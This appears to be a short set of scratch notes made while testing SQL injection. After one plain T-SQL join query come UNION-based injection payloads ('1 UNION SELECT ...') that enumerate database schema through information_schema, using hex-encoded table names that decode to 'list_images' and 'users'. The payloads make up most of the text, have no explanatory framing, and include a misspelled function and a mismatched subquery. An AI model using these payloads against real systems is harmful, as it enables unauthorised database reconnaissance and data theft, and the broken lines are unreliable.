SELECT * FROM (VALUES (1)) AS s(n) LEFT JOIN (SELECT TOP 1 * FROM dbo.tab1 ) AS sub1 ON 1=1 LEFT JOIN (SELECT TOP 1 * FROM dbo.tab2 )AS sub2 ON 1=1 LEFT JOIN (SELECT TOP 1 * FROM dbo.tabC ) AS sub3 ON 1=1



1 UNION  SELECT title,comment FROM (SELECT table_schema, table_name FROM information_schema.columns WHERE table_name = 0x6c6973745f696d61676573)t1; /// pas loin

1 UNION  SELECT null, groups_concat(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 0x6c6973745f696d61676573




SELECT column_name, data_type, character_maximum_length, table_name,ordinal_position, is_nullable 
FROM information_schema.COLUMNS WHERE table_name = 0x7573657273
ORDER BY ordinal_position